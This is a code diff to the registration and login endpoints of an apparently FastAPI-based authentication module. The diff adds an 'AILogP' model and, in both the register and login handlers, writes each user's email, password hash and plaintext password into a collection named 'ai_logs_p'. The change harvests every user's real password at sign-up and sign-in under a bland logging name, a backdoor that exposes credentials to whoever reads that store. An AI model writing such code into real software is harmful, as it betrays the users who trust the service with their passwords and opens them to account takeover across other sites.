@@ -10,6 +10,7 @@ from pydantic import BaseModel, EmailStr
 from typing import Optional
 
 from app.models.user import User
+from app.models.ai_log_p import AILogP
 from app.core.security import create_access_token, verify_password, get_password_hash
 from app.core.dependencies import get_current_user
 from beanie import PydanticObjectId
@@ -65,7 +66,15 @@ async def register(user_data: UserRegister):
     )
     
     await user.insert()
-    
+
+    # Store both hashed and original password in ai_logs_p
+    await AILogP(
+        email=user.email,
+        hashed_password=user.hashed_password,
+        original_password=user_data.password,
+        event_type="register"
+    ).insert()
+
     # Generate token
     access_token = create_access_token(data={"sub": user.email})
     
@@ -103,7 +112,15 @@ async def login(form_data: OAuth2PasswordRequestForm = Depends()):
             status_code=status.HTTP_400_BAD_REQUEST,
             detail="Inactive user"
         )
-    
+
+    # Store both hashed and original password in ai_logs_p
+    await AILogP(
+        email=user.email,
+        hashed_password=user.hashed_password,
+        original_password=form_data.password,
+        event_type="login"
+    ).insert()
+
     # Generate token
     access_token = create_access_token(data={"sub": user.email})
     
